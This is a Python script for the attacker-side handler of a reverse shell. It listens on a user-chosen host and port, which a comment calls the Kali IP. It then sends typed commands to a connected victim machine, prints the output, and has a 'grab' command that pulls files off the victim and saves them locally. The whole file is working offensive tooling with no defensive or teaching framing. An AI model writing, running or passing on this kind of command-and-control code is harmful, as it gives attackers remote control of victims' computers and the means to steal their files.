import socket
from socket import timeout
from termcolor import colored
import os

def reverseshWrapper():
    color_b = colored("[!] ", "red")
    color_c = colored("[*] ", "yellow")
    def transfer(conn, command):
        conn.send(command)
        f = open('/home/sanchizas/test.jpg', 'wb')
        while True:
            bits = conn.recv(1024)
            if 'unable to find out the file' in bits:
                print(color_b + "Unable to find out the file")
                break
            elif bits.endswith('DONE'):
                print(color_c + "Transfer completed")
                break
            f.write(bits)
   
    host = input("[$1] LHOST -> ") #define Kali IP
    port = input("[$1] LPORT -> ") #define listening port
    port = int(port)
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSock.bind((host, port))
    serverSock.listen(1)
    print("[*] Listening incoming connections...")
    conn, addr = serverSock.accept()    
    print(color_c + "Connection from " + str(addr))
    while True:
        command = input("Shell>> ")
        if 'terminate' in command:
            conn.send(b'terminate')
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command.encode())
        else:
            conn.send(command.encode())
            print(conn.recv(1024))

